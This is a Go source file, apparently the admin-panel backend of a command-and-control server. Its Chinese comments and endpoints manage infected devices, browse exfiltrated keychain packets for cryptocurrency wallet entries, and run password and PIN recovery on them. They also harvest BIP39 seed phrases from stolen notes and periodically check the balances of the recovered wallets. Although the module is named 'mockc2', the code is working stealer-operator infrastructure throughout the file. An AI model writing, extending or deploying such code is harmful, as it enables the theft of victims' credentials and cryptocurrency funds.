package server

import (
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"

	"mockc2/internal/config"
	"mockc2/internal/forensics"
	"mockc2/internal/store"
)

// 企业后台 panel API —— 全部由 MySQL 索引库解析。

func registerPanel(rt *Router) {
	// 我的设备：服务端分页（默认每页 20 条）+ kw/wallet 筛选下推。
	// 旧版一次性回传全部设备（含钱包/资产聚合字段），设备数增长后传输与表格渲染
	// 都会卡；分页后每页只回传 per 台（全量聚合结果仍由 store 侧 TTL 缓存承担）。
	rt.GET("/panel/api/devices", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		page := queryInt(r, "page", 1)
		per := queryInt(r, "per", 20)
		kw := r.URL.Query().Get("kw")
		wallet := r.URL.Query().Get("wallet")
		if wallet != "wallet" && wallet != "none" {
			wallet = "all"
		}
		writeJSON(w, http.StatusOK, store.ListDevicesPaged(page, per, kw, wallet))
	})

	rt.GET("/panel/api/progress", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		writeJSON(w, http.StatusOK, map[string]any{
			"checkpoints": store.StageCheckpointsJSON(),
			"rows":        store.StageProgressRows(),
		})
	})

	// 单设备资产钻取（设备详情抽屉）：war 原包下载路径 + 钱包 + 计数。
	rt.GET("/panel/api/device/{uuid}/assets", func(w http.ResponseWriter, r *http.Request, p map[string]string) {
		writeJSON(w, http.StatusOK, store.DeviceAssets(p["uuid"]))
	})

	rt.GET("/panel/api/apps", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		kw := r.URL.Query().Get("kw")
		page := queryInt(r, "page", 1)
		per := queryInt(r, "per", 40)
		out := store.ListApps(kw, page, per)
		out["ep"] = "u"
		writeJSON(w, http.StatusOK, out)
	})

	// war 战果：keychain 钱包命中条目（查库，支持设备/表/钱包/关键词收敛）。
	rt.GET("/panel/api/war", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		kw := r.URL.Query().Get("kw")
		tbl := r.URL.Query().Get("tbl")
		wallet := r.URL.Query().Get("wallet")
		device := r.URL.Query().Get("device")
		page := queryInt(r, "page", 1)
		per := queryInt(r, "per", 40)
		out := store.ListKeychainItems(kw, tbl, wallet, device, page, per)
		out["ep"] = "war"
		writeJSON(w, http.StatusOK, out)
	})

	// tools/ 取证工具挂载：解析回传的 /war（keychain）。
	// GET  取缓存报告；POST 触发解析（smart_forensics）或深度恢复（recover_all）。
	warFile := func(r *http.Request) (string, string) {
		pid := queryInt(r, "packet_id", 0)
		if pid <= 0 {
			return "", ""
		}
		row := store.PacketDetail(int64(pid))
		if row == nil {
			return "", ""
		}
		fp := store.ToStr(row["file_path"])
		if fp == "" {
			return "", store.ToStr(row["endpoint"])
		}
		return filepath.Join(config.Get().CaptureRoot, filepath.FromSlash(fp)), store.ToStr(row["endpoint"])
	}
	rt.GET("/panel/api/war/report", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		abs, _ := warFile(r)
		if abs == "" {
			writeJSON(w, http.StatusBadRequest, map[string]any{"error": "bad packet_id / 未落盘"})
			return
		}
		rep, err := forensics.RunSmart(abs, false)
		if err != nil {
			writeJSON(w, http.StatusOK, rep)
			return
		}
		writeJSON(w, http.StatusOK, rep)
	})
	rt.POST("/panel/api/war/analyze", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		abs, ep := warFile(r)
		if abs == "" || ep != "war" {
			writeJSON(w, http.StatusBadRequest, map[string]any{"error": "仅支持已落盘的 war 包"})
			return
		}
		refresh := r.URL.Query().Get("refresh") == "1"
		rep, err := forensics.RunSmart(abs, refresh)
		if err != nil && rep == nil {
			writeJSON(w, http.StatusInternalServerError, map[string]any{"error": err.Error()})
			return
		}
		writeJSON(w, http.StatusOK, rep)
	})
	rt.POST("/panel/api/war/recover", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		abs, ep := warFile(r)
		if abs == "" || ep != "war" {
			writeJSON(w, http.StatusBadRequest, map[string]any{"error": "仅支持已落盘的 war 包"})
			return
		}
		refresh := r.URL.Query().Get("refresh") == "1"
		deep := r.URL.Query().Get("deep_pin") == "1"
		var pw []string
		if v := r.URL.Query().Get("pw"); v != "" {
			pw = strings.Split(v, ",")
		}
		rep, err := forensics.RecoverAll(abs, pw, deep, refresh)
		if err != nil && rep == nil {
			writeJSON(w, http.StatusInternalServerError, map[string]any{"error": err.Error()})
			return
		}
		writeJSON(w, http.StatusOK, rep)
	})

	// /war 自动检测结果（war_scan 表）：批量列表 / 统计 / 详情 / 补扫缺失。
	rt.GET("/panel/api/war/scans", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		page := queryInt(r, "page", 1)
		per := queryInt(r, "per", 50)
		onlyHit := r.URL.Query().Get("only_hit") == "1"
		out := store.ListWarScans(page, per, onlyHit)
		out["stats"] = store.WarScanStats()
		writeJSON(w, http.StatusOK, out)
	})
	rt.GET("/panel/api/war/scan/stats", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		writeJSON(w, http.StatusOK, store.WarScanStats())
	})
	rt.GET("/panel/api/war/scan/detail", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		pid := queryInt(r, "packet_id", 0)
		d := store.WarScanDetail(int64(pid))
		if d == nil {
			writeJSON(w, http.StatusNotFound, map[string]any{"error": "not found"})
			return
		}
		writeJSON(w, http.StatusOK, d)
	})
	// 把尚未检测的历史 war 包全部入队后台补扫（不阻塞请求）。
	rt.POST("/panel/api/war/scan/pending", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		n := forensics.ScanPending(0)
		writeJSON(w, http.StatusOK, map[string]any{"enqueued": n})
	})

	// 助记词库：解析/还原出来的助记词（war 工具检测 + 备忘录命中）。
	rt.GET("/panel/api/words", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		page := queryInt(r, "page", 1)
		per := queryInt(r, "per", 50)
		onlyValid := r.URL.Query().Get("only_valid") == "1"
		kw := r.URL.Query().Get("kw")
		out := store.ListRecoveredWords(page, per, onlyValid, kw)
		out["stats"] = store.RecoveredWordsStats()
		writeJSON(w, http.StatusOK, out)
	})

	// 下载取证工具包（tools/ 打包为 tar.gz，供手动分析）。
	rt.GET("/panel/api/forensics/toolkit", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		w.Header().Set("Content-Type", "application/gzip")
		w.Header().Set("Content-Disposition", `attachment; filename="forensics_toolkit.tar.gz"`)
		_ = forensics.WriteToolkitTarGz(w)
	})

	// 助记词缓存余额（后台自动查好）：读取 / 触发重查。
	rt.GET("/panel/api/words/detail", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		id := queryInt(r, "id", 0)
		writeJSON(w, http.StatusOK, map[string]any{"id": id, "balance_json": store.WordBalanceJSON(int64(id))})
	})
	rt.POST("/panel/api/words/rebalance", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		if r.URL.Query().Get("all") == "1" {
			store.ResetWordBalances(0, true)
		} else {
			store.ResetWordBalances(int64(queryInt(r, "id", 0)), false)
		}
		writeJSON(w, http.StatusOK, map[string]any{"ok": true})
	})
	// 余额自动查询间隔（分钟）读取/设置（后台可配，kv 持久化）。
	rt.GET("/panel/api/words/config", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		writeJSON(w, http.StatusOK, map[string]any{"interval_min": store.GetBalanceIntervalMin()})
	})
	rt.POST("/panel/api/words/config", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		m := queryInt(r, "interval_min", store.GetBalanceIntervalMin())
		writeJSON(w, http.StatusOK, map[string]any{"interval_min": store.SetBalanceIntervalMin(m)})
	})
	// 监控开关：仅开启监控的条目由后台自动查询/周期刷新。
	rt.POST("/panel/api/words/monitor", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		id := queryInt(r, "id", 0)
		on := r.URL.Query().Get("on") == "1"
		store.SetWordMonitored(int64(id), on)
		writeJSON(w, http.StatusOK, map[string]any{"ok": true, "monitored": on})
	})

	rt.GET("/panel/api/notes", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		kw := r.URL.Query().Get("kw")
		page := queryInt(r, "page", 1)
		per := queryInt(r, "per", 40)
		writeJSON(w, http.StatusOK, store.ListMemos(kw, page, per))
	})

	// 备忘录 BIP39 助记词命中（读记录表 memo_bip39；前端只显示含助记词的条目）。
	// only_valid=1 仅返回校验通过。
	rt.GET("/panel/api/memos/bip39", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		page := queryInt(r, "page", 1)
		per := queryInt(r, "per", 50)
		onlyValid := r.URL.Query().Get("only_valid") == "1"
		writeJSON(w, http.StatusOK, store.QueryMemoBip39(page, per, onlyValid))
	})

	// 触发一次全量扫描（后台异步 + 单飞，立即返回，不占用请求）。
	rt.POST("/panel/api/memos/bip39/scan", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		writeJSON(w, http.StatusOK, store.StartMemoBip39Scan())
	})
	// 扫描状态（前端触发后轮询）。
	rt.GET("/panel/api/memos/bip39/scan", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		writeJSON(w, http.StatusOK, store.MemoBip39ScanStatus())
	})

	// BIP39 词表（2048 词，落库 bip39_words；前端「词表」模块）。
	rt.GET("/panel/api/bip39/words", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		kw := r.URL.Query().Get("kw")
		page := queryInt(r, "page", 1)
		per := queryInt(r, "per", 100)
		writeJSON(w, http.StatusOK, store.ListBip39Words(kw, page, per))
	})

	// war 包文件列表（前端「工具检测」模块：选中后跑 tools/ 取证工具）。
	rt.GET("/panel/api/war/files", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		page := queryInt(r, "page", 1)
		per := queryInt(r, "per", 50)
		writeJSON(w, http.StatusOK, store.ListWarFiles(page, per))
	})

	// keychain 聚合视图（按设备 / 按钱包规则）
	rt.GET("/panel/api/keychain/devices", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		writeJSON(w, http.StatusOK, map[string]any{"devices": store.KeychainDevices()})
	})

	// 单条钱包命中详情（列表点击跳转的解析页数据源）。
	rt.GET("/panel/api/keychain/item/{id}", func(w http.ResponseWriter, r *http.Request, p map[string]string) {
		id, err := parseInt64(p["id"])
		if err != nil || id <= 0 {
			writeJSON(w, http.StatusBadRequest, map[string]any{"error": "bad id"})
			return
		}
		row := store.KeychainItemDetail(id)
		if row == nil {
			writeJSON(w, http.StatusNotFound, map[string]any{"error": "not found"})
			return
		}
		writeJSON(w, http.StatusOK, row)
	})

	// 指令结果（result 端点 data 解码落库）
	rt.GET("/panel/api/results", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		kw := r.URL.Query().Get("kw")
		page := queryInt(r, "page", 1)
		per := queryInt(r, "per", 40)
		writeJSON(w, http.StatusOK, store.ListResultData(kw, page, per))
	})

	rt.GET("/panel/api/result/{id}", func(w http.ResponseWriter, r *http.Request, p map[string]string) {
		id, err := parseInt64(p["id"])
		if err != nil || id <= 0 {
			writeJSON(w, http.StatusBadRequest, map[string]any{"error": "bad id"})
			return
		}
		row := store.ResultDetail(id)
		if row == nil {
			writeJSON(w, http.StatusNotFound, map[string]any{"error": "not found"})
			return
		}
		writeJSON(w, http.StatusOK, row)
	})

	// 访问统计（访客台账 devices 表）：服务端分页（默认每页 20 条）+ kw 筛选下推。
	// 旧版 n 参数（一次性取前 N 条）保留兼容：未显式传 page 时 n 作为 per 使用。
	rt.GET("/panel/api/visits", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		q := r.URL.Query()
		page := queryInt(r, "page", 1)
		per := queryInt(r, "per", 20)
		if !q.Has("page") {
			if n := queryInt(r, "n", 0); n > 0 {
				per = n
			}
		}
		if page < 1 {
			page = 1
		}
		if per < 1 {
			per = 20
		}
		if per > 2000 {
			per = 2000
		}
		kw := strings.TrimSpace(q.Get("kw"))

		db := store.GetDB()
		where, args := "", []any{}
		if kw != "" {
			like := "%" + kw + "%"
			where = " WHERE ip LIKE ? OR device_version LIKE ? OR domain LIKE ? OR host LIKE ? OR ua LIKE ?"
			args = append(args, like, like, like, like, like)
		}
		// 分页总数 = 当前筛选条件下的行数（page 有多少页由它决定）
		total := store.ToInt(db.QueryOne("SELECT COUNT(*) AS n FROM devices"+where, args...)["n"])
		rows := db.Query(
			"SELECT last_seen AS ts, ip, device_version, domain, host, ua"+
				" FROM devices"+where+" ORDER BY last_seen DESC, id DESC LIMIT ? OFFSET ?",
			append(append([]any{}, args...), per, (page-1)*per)...)
		clients := make([]string, 0, len(rows))
		for _, row := range rows {
			if client := store.ToStr(row["ip"]); client != "" {
				clients = append(clients, client)
			}
		}
		progress := store.ClientStageProgressFor(clients)
		for _, row := range rows {
			client := store.ToStr(row["ip"])
			pct := progress[client]
			row["progress"] = pct
			row["stage"] = store.StageNameForPercent(pct)
		}
		// 去重来访（全量口径，头部 chip；与列表筛选无关）
		totalVisits := store.ToInt(db.QueryOne(
			"SELECT COUNT(DISTINCT CONCAT(ip,'|',COALESCE(device_version,''))) AS n FROM devices")["n"])
		// 今日新增（first_seen 当日，与仪表盘同口径）
		today := time.Now().Format("2006-01-02")
		todayN := store.ToInt(db.QueryOne(
			"SELECT COUNT(DISTINCT CONCAT(ip,'|',COALESCE(device_version,''))) AS n FROM devices"+
				" WHERE SUBSTR(first_seen,1,10)=?", today)["n"])
		writeJSON(w, http.StatusOK, map[string]any{
			"records": rows, "total": total, "total_visits": totalVisits,
			"today_visits": todayN, "page": page, "per": per,
			"progress": progress})
	})

	rt.GET("/panel/download", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		root := config.Get().CaptureRoot
		if pidStr := r.URL.Query().Get("packet_id"); pidStr != "" {
			pid, err := parseInt64(pidStr)
			if err != nil {
				writeJSON(w, http.StatusBadRequest, map[string]any{"error": "bad packet_id"})
				return
			}
			row := store.PacketDetail(pid)
			if row == nil {
				writeJSON(w, http.StatusNotFound, map[string]any{"error": "not found"})
				return
			}
			serveFile(w, filepath.Join(root, filepath.FromSlash(store.ToStr(row["file_path"]))), "", "no-store")
			return
		}
		ep := r.URL.Query().Get("ep")
		name := r.URL.Query().Get("name")
		if ep == "notesdb" {
			dbDir := filepath.Join(root, "notes_db")
			var hits []string
			_ = filepath.WalkDir(dbDir, func(p string, d os.DirEntry, err error) error {
				if err == nil && !d.IsDir() && d.Name() == name {
					hits = append(hits, p)
				}
				return nil
			})
			if len(hits) == 0 {
				writeJSON(w, http.StatusNotFound, map[string]any{"error": "not found"})
				return
			}
			serveFile(w, hits[0], "", "no-store")
			return
		}
		path := filepath.Join(root, ep, name)
		rel, err := filepath.Rel(root, path)
		if err != nil || strings.HasPrefix(rel, "..") {
			writeJSON(w, http.StatusForbidden, map[string]any{"error": "forbidden"})
			return
		}
		if !isFile(path) {
			writeJSON(w, http.StatusNotFound, map[string]any{"error": "not found"})
			return
		}
		dl := "inline"
		if ep == "u" || ep == "war" || ep == "notesdb" {
			dl = "attachment"
		}
		w.Header().Set("Content-Disposition", dl+`; filename="`+name+`"`)
		serveFile(w, path, "", "no-store")
	})
}

// /console 兼容入口：单控制台后直接 302 跳管理台（原「双控制台导航页」已随静态看板下线）。
func registerPanelEntry(rt *Router) {
	rt.GET("/console", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		p := strings.TrimRight(config.Get().AdminPath, "/")
		if p == "" {
			p = "/admin"
		}
		http.Redirect(w, r, p+"/", http.StatusFound)
	})
}

func pageRange(page, per, total int) (int, int) {
	start := (page - 1) * per
	if start < 0 {
		start = 0
	}
	if start > total {
		start = total
	}
	end := start + per
	if end > total {
		end = total
	}
	return start, end
}

func asSlice(v any) []any {
	if s, ok := v.([]any); ok {
		return s
	}
	return nil
}
